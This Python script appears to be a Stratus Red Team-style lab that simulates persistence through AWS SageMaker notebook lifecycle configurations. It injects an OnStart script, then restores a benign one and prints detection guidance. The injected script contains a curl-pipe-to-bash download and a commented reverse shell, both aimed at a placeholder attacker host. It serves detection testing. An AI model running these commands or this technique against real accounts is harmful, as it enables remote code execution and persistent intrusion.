"""
Technique : aws.execution.sagemaker-update-lifecycle-config
Tactic    : Execution (T1059)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.execution.sagemaker-update-lifecycle-config/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the lifecycle configuration.

How the attack works:
  An attacker with sagemaker:UpdateNotebookInstanceLifecycleConfig overwrites the
  OnStart script of a SageMaker notebook lifecycle configuration with a malicious
  shell script. The script executes with notebook-instance privileges whenever the
  notebook starts or restarts — providing persistent code execution on every boot.

Detection signal:
  - sagemaker:UpdateNotebookInstanceLifecycleConfig in CloudTrail with a
    base64-encoded OnStart script containing suspicious content (curl, wget,
    base64-decoded executables, reverse shells).

Revert:
  - Automated: Restore the original benign OnStart script.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import base64
import json
import os
import subprocess
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Constants ─────────────────────────────────────────────────────────────────

DWELL_TIME_S = 2

# Malicious OnStart script — simulates downloading and executing a payload
_MALICIOUS_SCRIPT = (
    b"#!/bin/bash\n"
    b"# Stratus Red Team - malicious SageMaker lifecycle script\n"
    b"# In a real attack this would download and execute a C2 agent\n"
    b"curl -s http://attacker.example.com/payload | bash\n"
    b"# Alternative: reverse shell\n"
    b"# bash -i >& /dev/tcp/attacker.example.com/4444 0>&1\n"
)
MALICIOUS_SCRIPT_B64 = base64.b64encode(_MALICIOUS_SCRIPT).decode("utf-8")

# Benign OnStart script — restored during revert
_BENIGN_SCRIPT = (
    b"#!/bin/bash\n"
    b"echo 'SageMaker notebook instance starting...'\n"
)
BENIGN_SCRIPT_B64 = base64.b64encode(_BENIGN_SCRIPT).decode("utf-8")


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir, capture_output=True, text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir            = str(Path(__file__).parent.parent / "infra")
    infra                = get_pulumi_outputs(stack_dir)
    lifecycle_config_name = infra.get("lifecycle_config_name", "")

    if not lifecycle_config_name:
        print("[!] lifecycle_config_name not found. Did you run `pulumi up`?")
        return

    session          = boto3.Session()
    sagemaker_client = session.client("sagemaker")

    try:
        # ── Step 1: Inject malicious OnStart script ───────────────────────────
        banner("Step 1 — Inject malicious OnStart script (UpdateNotebookInstanceLifecycleConfig)")
        sagemaker_client.update_notebook_instance_lifecycle_config(
            NotebookInstanceLifecycleConfigName=lifecycle_config_name,
            OnStart=[{"Content": MALICIOUS_SCRIPT_B64}],
        )
        print(f"  [+] Lifecycle config updated: {lifecycle_config_name}")
        print(f"  [!] CloudTrail event: sagemaker:UpdateNotebookInstanceLifecycleConfig")
        print(f"  [!] Malicious OnStart script will execute on every notebook start/restart.")
        print(f"  [!] Script contains: curl http://attacker.example.com/payload | bash")

        # ── Step 2: Decode and display the injected script ────────────────────
        banner("Step 2 — Verify injected script content")
        resp   = sagemaker_client.describe_notebook_instance_lifecycle_config(
            NotebookInstanceLifecycleConfigName=lifecycle_config_name,
        )
        on_start_items = resp.get("OnStart", [])
        if on_start_items:
            content_b64 = on_start_items[0].get("Content", "")
            decoded     = base64.b64decode(content_b64).decode("utf-8", errors="replace")
            print(f"  [+] OnStart script (decoded):")
            for line in decoded.splitlines():
                print(f"      {line}")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert: Restore benign OnStart script ─────────────────────────────
        banner("Revert — Restore benign OnStart script")
        if lifecycle_config_name:
            try:
                sagemaker_client.update_notebook_instance_lifecycle_config(
                    NotebookInstanceLifecycleConfigName=lifecycle_config_name,
                    OnStart=[{"Content": BENIGN_SCRIPT_B64}],
                )
                print(f"  [+] Benign script restored for: {lifecycle_config_name}")
                print(f"  [!] CloudTrail event: sagemaker:UpdateNotebookInstanceLifecycleConfig")
            except ClientError as exc:
                print(f"  [!] UpdateNotebookInstanceLifecycleConfig (restore) failed: {exc}")

    banner("Complete")
    print("CloudTrail events: sagemaker:UpdateNotebookInstanceLifecycleConfig x2")
    print("                   sagemaker:DescribeNotebookInstanceLifecycleConfig")
    print("\nDetection guidance:")
    print("  Alert on sagemaker:UpdateNotebookInstanceLifecycleConfig from unexpected")
    print("  principals — especially when the OnStart content contains curl/wget/base64.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the lifecycle configuration.")


if __name__ == "__main__":
    main()
